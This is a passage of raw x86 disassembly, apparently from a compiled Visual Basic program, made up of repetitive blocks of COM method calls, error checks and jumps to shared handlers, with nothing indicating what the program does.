  406b8d:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406b93:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406b96:	50                   	push   %eax
  406b97:	52                   	push   %edx
  406b98:	ff d3                	call   *%ebx
  406b9a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406ba0:	8b 06                	mov    (%esi),%eax
  406ba2:	56                   	push   %esi
  406ba3:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406ba9:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406bac:	50                   	push   %eax
  406bad:	51                   	push   %ecx
  406bae:	ff d3                	call   *%ebx
  406bb0:	8b 10                	mov    (%eax),%edx
  406bb2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406bb5:	51                   	push   %ecx
  406bb6:	50                   	push   %eax
  406bb7:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  406bbd:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406bc3:	85 c0                	test   %eax,%eax
  406bc5:	db e2                	fnclex
  406bc7:	7d 18                	jge    0x406be1
  406bc9:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  406bcf:	68 a0 00 00 00       	push   $0xa0
  406bd4:	68 38 30 40 00       	push   $0x403038
  406bd9:	52                   	push   %edx
  406bda:	50                   	push   %eax
  406bdb:	ff 15 38 10 40 00    	call   *0x401038
  406be1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406be4:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  406bea:	89 45 98             	mov    %eax,-0x68(%ebp)
  406bed:	b8 08 00 00 00       	mov    $0x8,%eax
  406bf2:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406bf5:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  406bfc:	89 45 90             	mov    %eax,-0x70(%ebp)
  406bff:	c7 85 58 ff ff ff 18 	movl   $0x403218,-0xa8(%ebp)
  406c06:	32 40 00 
  406c09:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  406c0f:	ff 15 20 11 40 00    	call   *0x401120
  406c15:	c7 85 68 ff ff ff 88 	movl   $0x403288,-0x98(%ebp)
  406c1c:	32 40 00 
  406c1f:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  406c25:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406c28:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  406c2f:	00 00 00 
  406c32:	ff 15 20 11 40 00    	call   *0x401120
  406c38:	33 c0                	xor    %eax,%eax
  406c3a:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  406c40:	0f 94 c0             	sete   %al
  406c43:	f7 d8                	neg    %eax
  406c45:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406c48:	66 89 85 78 ff ff ff 	mov    %ax,-0x88(%ebp)
  406c4f:	8d 55 c0             	lea    -0x40(%ebp),%edx
  406c52:	51                   	push   %ecx
  406c53:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  406c59:	52                   	push   %edx
  406c5a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  406c5d:	50                   	push   %eax
  406c5e:	51                   	push   %ecx
  406c5f:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  406c66:	00 00 00 
  406c69:	ff 15 04 11 40 00    	call   *0x401104
  406c6f:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406c75:	8d 45 90             	lea    -0x70(%ebp),%eax
  406c78:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  406c7b:	50                   	push   %eax
  406c7c:	8b 3a                	mov    (%edx),%edi
  406c7e:	8d 55 80             	lea    -0x80(%ebp),%edx
  406c81:	51                   	push   %ecx
  406c82:	52                   	push   %edx
  406c83:	ff 15 d0 10 40 00    	call   *0x4010d0
  406c89:	50                   	push   %eax
  406c8a:	8d 45 d8             	lea    -0x28(%ebp),%eax
  406c8d:	50                   	push   %eax
  406c8e:	ff 15 cc 10 40 00    	call   *0x4010cc
  406c94:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406c9a:	50                   	push   %eax
  406c9b:	51                   	push   %ecx
  406c9c:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  406ca2:	85 c0                	test   %eax,%eax
  406ca4:	db e2                	fnclex
  406ca6:	0f 8d 06 15 00 00    	jge    0x4081b2
  406cac:	e9 e9 14 00 00       	jmp    0x40819a
  406cb1:	8b 16                	mov    (%esi),%edx
  406cb3:	56                   	push   %esi
  406cb4:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406cba:	50                   	push   %eax
  406cbb:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406cbe:	50                   	push   %eax
  406cbf:	ff d3                	call   *%ebx
  406cc1:	8b 0e                	mov    (%esi),%ecx
  406cc3:	56                   	push   %esi
  406cc4:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406cca:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406cd0:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406cd3:	50                   	push   %eax
  406cd4:	52                   	push   %edx
  406cd5:	ff d3                	call   *%ebx
  406cd7:	8b 08                	mov    (%eax),%ecx
  406cd9:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406cdc:	52                   	push   %edx
  406cdd:	50                   	push   %eax
  406cde:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  406ce4:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406cea:	85 c0                	test   %eax,%eax
  406cec:	db e2                	fnclex
  406cee:	7d 18                	jge    0x406d08
  406cf0:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  406cf6:	68 a0 00 00 00       	push   $0xa0
  406cfb:	68 38 30 40 00       	push   $0x403038
  406d00:	51                   	push   %ecx
  406d01:	50                   	push   %eax
  406d02:	ff 15 38 10 40 00    	call   *0x401038
  406d08:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406d0b:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  406d11:	89 45 98             	mov    %eax,-0x68(%ebp)
  406d14:	b8 08 00 00 00       	mov    $0x8,%eax
  406d19:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406d1c:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  406d23:	89 45 90             	mov    %eax,-0x70(%ebp)
  406d26:	c7 85 58 ff ff ff 20 	movl   $0x403220,-0xa8(%ebp)
  406d2d:	32 40 00 
  406d30:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  406d36:	ff 15 20 11 40 00    	call   *0x401120
  406d3c:	8d 95 60 ff ff ff    	lea    -0xa0(%ebp),%edx
  406d42:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406d45:	c7 85 68 ff ff ff 90 	movl   $0x403290,-0x98(%ebp)
  406d4c:	32 40 00 
  406d4f:	c7 85 60 ff ff ff 08 	movl   $0x8,-0xa0(%ebp)
  406d56:	00 00 00 
  406d59:	ff 15 20 11 40 00    	call   *0x401120
  406d5f:	33 d2                	xor    %edx,%edx
  406d61:	81 ff 00 80 ff ff    	cmp    $0xffff8000,%edi
  406d67:	0f 94 c2             	sete   %dl
  406d6a:	f7 da                	neg    %edx
  406d6c:	8d 45 b0             	lea    -0x50(%ebp),%eax
  406d6f:	66 89 95 78 ff ff ff 	mov    %dx,-0x88(%ebp)
  406d76:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406d79:	50                   	push   %eax
  406d7a:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  406d80:	51                   	push   %ecx
  406d81:	8d 45 a0             	lea    -0x60(%ebp),%eax
  406d84:	52                   	push   %edx
  406d85:	50                   	push   %eax
  406d86:	c7 85 70 ff ff ff 0b 	movl   $0xb,-0x90(%ebp)
  406d8d:	00 00 00 
  406d90:	ff 15 04 11 40 00    	call   *0x401104
  406d96:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406d9c:	8d 55 90             	lea    -0x70(%ebp),%edx
  406d9f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  406da2:	52                   	push   %edx
  406da3:	8b 39                	mov    (%ecx),%edi
  406da5:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  406da8:	50                   	push   %eax
  406da9:	51                   	push   %ecx
  406daa:	ff 15 d0 10 40 00    	call   *0x4010d0
  406db0:	8d 55 d8             	lea    -0x28(%ebp),%edx
  406db3:	50                   	push   %eax
  406db4:	52                   	push   %edx
  406db5:	ff 15 cc 10 40 00    	call   *0x4010cc
  406dbb:	50                   	push   %eax
  406dbc:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406dc2:	50                   	push   %eax
  406dc3:	ff 97 a4 00 00 00    	call   *0xa4(%edi)
  406dc9:	85 c0                	test   %eax,%eax
  406dcb:	db e2                	fnclex
  406dcd:	7d 18                	jge    0x406de7
  406dcf:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406dd5:	68 a4 00 00 00       	push   $0xa4
  406dda:	68 38 30 40 00       	push   $0x403038
  406ddf:	51                   	push   %ecx
  406de0:	50                   	push   %eax
  406de1:	ff 15 38 10 40 00    	call   *0x401038
  406de7:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406dea:	ff 15 64 11 40 00    	call   *0x401164
  406df0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406df3:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  406df6:	52                   	push   %edx
  406df7:	50                   	push   %eax
  406df8:	6a 02                	push   $0x2
  406dfa:	ff 15 20 10 40 00    	call   *0x401020
  406e00:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  406e03:	8d 55 a0             	lea    -0x60(%ebp),%edx
  406e06:	51                   	push   %ecx
  406e07:	8d 45 90             	lea    -0x70(%ebp),%eax
  406e0a:	52                   	push   %edx
  406e0b:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406e0e:	50                   	push   %eax
  406e0f:	8d 55 c0             	lea    -0x40(%ebp),%edx
  406e12:	51                   	push   %ecx
  406e13:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  406e19:	52                   	push   %edx
  406e1a:	50                   	push   %eax
  406e1b:	6a 06                	push   $0x6
  406e1d:	ff 15 18 10 40 00    	call   *0x401018
  406e23:	83 c4 28             	add    $0x28,%esp
  406e26:	e9 9d 1f 00 00       	jmp    0x408dc8
  406e2b:	8b 0e                	mov    (%esi),%ecx
  406e2d:	56                   	push   %esi
  406e2e:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406e34:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406e37:	50                   	push   %eax
  406e38:	52                   	push   %edx
  406e39:	ff d3                	call   *%ebx
  406e3b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406e41:	8b 06                	mov    (%esi),%eax
  406e43:	56                   	push   %esi
  406e44:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406e4a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406e4d:	50                   	push   %eax
  406e4e:	51                   	push   %ecx
  406e4f:	ff d3                	call   *%ebx
  406e51:	8b 10                	mov    (%eax),%edx
  406e53:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406e56:	51                   	push   %ecx
  406e57:	50                   	push   %eax
  406e58:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  406e5e:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406e64:	85 c0                	test   %eax,%eax
  406e66:	db e2                	fnclex
  406e68:	7d 18                	jge    0x406e82
  406e6a:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  406e70:	68 a0 00 00 00       	push   $0xa0
  406e75:	68 38 30 40 00       	push   $0x403038
  406e7a:	52                   	push   %edx
  406e7b:	50                   	push   %eax
  406e7c:	ff 15 38 10 40 00    	call   *0x401038
  406e82:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406e85:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  406e8b:	89 45 98             	mov    %eax,-0x68(%ebp)
  406e8e:	b8 08 00 00 00       	mov    $0x8,%eax
  406e93:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406e96:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  406e9d:	89 45 90             	mov    %eax,-0x70(%ebp)
  406ea0:	c7 85 58 ff ff ff 28 	movl   $0x403228,-0xa8(%ebp)
  406ea7:	32 40 00 
  406eaa:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  406eb0:	ff 15 20 11 40 00    	call   *0x401120
  406eb6:	c7 85 68 ff ff ff cc 	movl   $0x4030cc,-0x98(%ebp)
  406ebd:	30 40 00 
  406ec0:	e9 5a fd ff ff       	jmp    0x406c1f
  406ec5:	8b 16                	mov    (%esi),%edx
  406ec7:	56                   	push   %esi
  406ec8:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406ece:	50                   	push   %eax
  406ecf:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406ed2:	50                   	push   %eax
  406ed3:	ff d3                	call   *%ebx
  406ed5:	8b 0e                	mov    (%esi),%ecx
  406ed7:	56                   	push   %esi
  406ed8:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406ede:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406ee4:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406ee7:	50                   	push   %eax
  406ee8:	52                   	push   %edx
  406ee9:	ff d3                	call   *%ebx
  406eeb:	8b 08                	mov    (%eax),%ecx
  406eed:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406ef0:	52                   	push   %edx
  406ef1:	50                   	push   %eax
  406ef2:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  406ef8:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406efe:	85 c0                	test   %eax,%eax
  406f00:	db e2                	fnclex
  406f02:	7d 18                	jge    0x406f1c
  406f04:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  406f0a:	68 a0 00 00 00       	push   $0xa0
  406f0f:	68 38 30 40 00       	push   $0x403038
  406f14:	51                   	push   %ecx
  406f15:	50                   	push   %eax
  406f16:	ff 15 38 10 40 00    	call   *0x401038
  406f1c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406f1f:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  406f25:	89 45 98             	mov    %eax,-0x68(%ebp)
  406f28:	b8 08 00 00 00       	mov    $0x8,%eax
  406f2d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406f30:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  406f37:	89 45 90             	mov    %eax,-0x70(%ebp)
  406f3a:	c7 85 58 ff ff ff 30 	movl   $0x403230,-0xa8(%ebp)
  406f41:	32 40 00 
  406f44:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  406f4a:	ff 15 20 11 40 00    	call   *0x401120
  406f50:	c7 85 68 ff ff ff 98 	movl   $0x403298,-0x98(%ebp)
  406f57:	32 40 00 
  406f5a:	e9 77 0e 00 00       	jmp    0x407dd6
  406f5f:	8b 0e                	mov    (%esi),%ecx
  406f61:	56                   	push   %esi
  406f62:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406f68:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406f6b:	50                   	push   %eax
  406f6c:	52                   	push   %edx
  406f6d:	ff d3                	call   *%ebx
  406f6f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406f75:	8b 06                	mov    (%esi),%eax
  406f77:	56                   	push   %esi
  406f78:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406f7e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406f81:	50                   	push   %eax
  406f82:	51                   	push   %ecx
  406f83:	ff d3                	call   *%ebx
  406f85:	8b 10                	mov    (%eax),%edx
  406f87:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406f8a:	51                   	push   %ecx
  406f8b:	50                   	push   %eax
  406f8c:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  406f92:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406f98:	85 c0                	test   %eax,%eax
  406f9a:	db e2                	fnclex
  406f9c:	7d 18                	jge    0x406fb6
  406f9e:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  406fa4:	68 a0 00 00 00       	push   $0xa0
  406fa9:	68 38 30 40 00       	push   $0x403038
  406fae:	52                   	push   %edx
  406faf:	50                   	push   %eax
  406fb0:	ff 15 38 10 40 00    	call   *0x401038
  406fb6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406fb9:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  406fbf:	89 45 98             	mov    %eax,-0x68(%ebp)
  406fc2:	b8 08 00 00 00       	mov    $0x8,%eax
  406fc7:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  406fca:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  406fd1:	89 45 90             	mov    %eax,-0x70(%ebp)
  406fd4:	c7 85 58 ff ff ff 38 	movl   $0x403238,-0xa8(%ebp)
  406fdb:	32 40 00 
  406fde:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  406fe4:	ff 15 20 11 40 00    	call   *0x401120
  406fea:	c7 85 68 ff ff ff a0 	movl   $0x4032a0,-0x98(%ebp)
  406ff1:	32 40 00 
  406ff4:	e9 26 fc ff ff       	jmp    0x406c1f
  406ff9:	8b 16                	mov    (%esi),%edx
  406ffb:	56                   	push   %esi
  406ffc:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407002:	50                   	push   %eax
  407003:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407006:	50                   	push   %eax
  407007:	ff d3                	call   *%ebx
  407009:	8b 0e                	mov    (%esi),%ecx
  40700b:	56                   	push   %esi
  40700c:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407012:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407018:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40701b:	50                   	push   %eax
  40701c:	52                   	push   %edx
  40701d:	ff d3                	call   *%ebx
  40701f:	8b 08                	mov    (%eax),%ecx
  407021:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407024:	52                   	push   %edx
  407025:	50                   	push   %eax
  407026:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  40702c:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  407032:	85 c0                	test   %eax,%eax
  407034:	db e2                	fnclex
  407036:	7d 18                	jge    0x407050
  407038:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  40703e:	68 a0 00 00 00       	push   $0xa0
  407043:	68 38 30 40 00       	push   $0x403038
  407048:	51                   	push   %ecx
  407049:	50                   	push   %eax
  40704a:	ff 15 38 10 40 00    	call   *0x401038
  407050:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407053:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407059:	89 45 98             	mov    %eax,-0x68(%ebp)
  40705c:	b8 08 00 00 00       	mov    $0x8,%eax
  407061:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407064:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40706b:	89 45 90             	mov    %eax,-0x70(%ebp)
  40706e:	c7 85 58 ff ff ff 40 	movl   $0x403240,-0xa8(%ebp)
  407075:	32 40 00 
  407078:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40707e:	ff 15 20 11 40 00    	call   *0x401120
  407084:	c7 85 68 ff ff ff a8 	movl   $0x4032a8,-0x98(%ebp)
  40708b:	32 40 00 
  40708e:	e9 43 0d 00 00       	jmp    0x407dd6
  407093:	8b 0e                	mov    (%esi),%ecx
  407095:	56                   	push   %esi
  407096:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40709c:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40709f:	50                   	push   %eax
  4070a0:	52                   	push   %edx
  4070a1:	ff d3                	call   *%ebx
  4070a3:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4070a9:	8b 06                	mov    (%esi),%eax
  4070ab:	56                   	push   %esi
  4070ac:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  4070b2:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4070b5:	50                   	push   %eax
  4070b6:	51                   	push   %ecx
  4070b7:	ff d3                	call   *%ebx
  4070b9:	8b 10                	mov    (%eax),%edx
  4070bb:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4070be:	51                   	push   %ecx
  4070bf:	50                   	push   %eax
  4070c0:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4070c6:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4070cc:	85 c0                	test   %eax,%eax
  4070ce:	db e2                	fnclex
  4070d0:	7d 18                	jge    0x4070ea
  4070d2:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4070d8:	68 a0 00 00 00       	push   $0xa0
  4070dd:	68 38 30 40 00       	push   $0x403038
  4070e2:	52                   	push   %edx
  4070e3:	50                   	push   %eax
  4070e4:	ff 15 38 10 40 00    	call   *0x401038
  4070ea:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4070ed:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4070f3:	89 45 98             	mov    %eax,-0x68(%ebp)
  4070f6:	b8 08 00 00 00       	mov    $0x8,%eax
  4070fb:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4070fe:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407105:	89 45 90             	mov    %eax,-0x70(%ebp)
  407108:	c7 85 58 ff ff ff 48 	movl   $0x403248,-0xa8(%ebp)
  40710f:	32 40 00 
  407112:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407118:	ff 15 20 11 40 00    	call   *0x401120
  40711e:	c7 85 68 ff ff ff b0 	movl   $0x4032b0,-0x98(%ebp)
  407125:	32 40 00 
  407128:	e9 f2 fa ff ff       	jmp    0x406c1f
  40712d:	8b 16                	mov    (%esi),%edx
  40712f:	56                   	push   %esi
  407130:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  407136:	50                   	push   %eax
  407137:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40713a:	50                   	push   %eax
  40713b:	ff d3                	call   *%ebx
  40713d:	8b 0e                	mov    (%esi),%ecx
  40713f:	56                   	push   %esi
  407140:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407146:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40714c:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40714f:	50                   	push   %eax
  407150:	52                   	push   %edx
  407151:	ff d3                	call   *%ebx
  407153:	8b 08                	mov    (%eax),%ecx
  407155:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407158:	52                   	push   %edx
  407159:	50                   	push   %eax
  40715a:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407160:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  407166:	85 c0                	test   %eax,%eax
  407168:	db e2                	fnclex
  40716a:	7d 18                	jge    0x407184
  40716c:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  407172:	68 a0 00 00 00       	push   $0xa0
  407177:	68 38 30 40 00       	push   $0x403038
  40717c:	51                   	push   %ecx
  40717d:	50                   	push   %eax
  40717e:	ff 15 38 10 40 00    	call   *0x401038
  407184:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407187:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  40718d:	89 45 98             	mov    %eax,-0x68(%ebp)
  407190:	b8 08 00 00 00       	mov    $0x8,%eax
  407195:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407198:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  40719f:	89 45 90             	mov    %eax,-0x70(%ebp)
  4071a2:	c7 85 58 ff ff ff 50 	movl   $0x403250,-0xa8(%ebp)
  4071a9:	32 40 00 
  4071ac:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4071b2:	ff 15 20 11 40 00    	call   *0x401120
  4071b8:	c7 85 68 ff ff ff 4c 	movl   $0x40314c,-0x98(%ebp)
  4071bf:	31 40 00 
  4071c2:	e9 0f 0c 00 00       	jmp    0x407dd6
  4071c7:	8b 0e                	mov    (%esi),%ecx
  4071c9:	56                   	push   %esi
  4071ca:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4071d0:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4071d3:	50                   	push   %eax
  4071d4:	52                   	push   %edx
  4071d5:	ff d3                	call   *%ebx
  4071d7:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4071dd:	8b 06                	mov    (%esi),%eax
  4071df:	56                   	push   %esi
  4071e0:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  4071e6:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4071e9:	50                   	push   %eax
  4071ea:	51                   	push   %ecx
  4071eb:	ff d3                	call   *%ebx
  4071ed:	8b 10                	mov    (%eax),%edx
  4071ef:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4071f2:	51                   	push   %ecx
  4071f3:	50                   	push   %eax
  4071f4:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  4071fa:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  407200:	85 c0                	test   %eax,%eax
  407202:	db e2                	fnclex
  407204:	7d 18                	jge    0x40721e
  407206:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  40720c:	68 a0 00 00 00       	push   $0xa0
  407211:	68 38 30 40 00       	push   $0x403038
  407216:	52                   	push   %edx
  407217:	50                   	push   %eax
  407218:	ff 15 38 10 40 00    	call   *0x401038
  40721e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407221:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  407227:	89 45 98             	mov    %eax,-0x68(%ebp)
  40722a:	b8 08 00 00 00       	mov    $0x8,%eax
  40722f:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  407232:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  407239:	89 45 90             	mov    %eax,-0x70(%ebp)
  40723c:	c7 85 58 ff ff ff 58 	movl   $0x403258,-0xa8(%ebp)
  407243:	32 40 00 
  407246:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  40724c:	ff 15 20 11 40 00    	call   *0x401120
  407252:	c7 85 68 ff ff ff b8 	movl   $0x4032b8,-0x98(%ebp)
  407259:	32 40 00 
  40725c:	e9 be f9 ff ff       	jmp    0x406c1f
  407261:	8b 16                	mov    (%esi),%edx
  407263:	56                   	push   %esi
  407264:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40726a:	50                   	push   %eax
  40726b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40726e:	50                   	push   %eax
  40726f:	ff d3                	call   *%ebx
  407271:	8b 0e                	mov    (%esi),%ecx
  407273:	56                   	push   %esi
  407274:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40727a:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407280:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407283:	50                   	push   %eax
  407284:	52                   	push   %edx
  407285:	ff d3                	call   *%ebx
  407287:	8b 08                	mov    (%eax),%ecx
  407289:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40728c:	52                   	push   %edx
  40728d:	50                   	push   %eax
  40728e:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  407294:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  40729a:	85 c0                	test   %eax,%eax
  40729c:	db e2                	fnclex
  40729e:	7d 18                	jge    0x4072b8
  4072a0:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  4072a6:	68 a0 00 00 00       	push   $0xa0
  4072ab:	68 38 30 40 00       	push   $0x403038
  4072b0:	51                   	push   %ecx
  4072b1:	50                   	push   %eax
  4072b2:	ff 15 38 10 40 00    	call   *0x401038
  4072b8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4072bb:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  4072c1:	89 45 98             	mov    %eax,-0x68(%ebp)
  4072c4:	b8 08 00 00 00       	mov    $0x8,%eax
  4072c9:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4072cc:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4072d3:	89 45 90             	mov    %eax,-0x70(%ebp)
  4072d6:	c7 85 58 ff ff ff 60 	movl   $0x403260,-0xa8(%ebp)
  4072dd:	32 40 00 
  4072e0:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4072e6:	ff 15 20 11 40 00    	call   *0x401120
  4072ec:	c7 85 68 ff ff ff c0 	movl   $0x4032c0,-0x98(%ebp)
  4072f3:	32 40 00 
  4072f6:	e9 db 0a 00 00       	jmp    0x407dd6
  4072fb:	8b 0e                	mov    (%esi),%ecx
  4072fd:	56                   	push   %esi
  4072fe:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  407304:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407307:	50                   	push   %eax
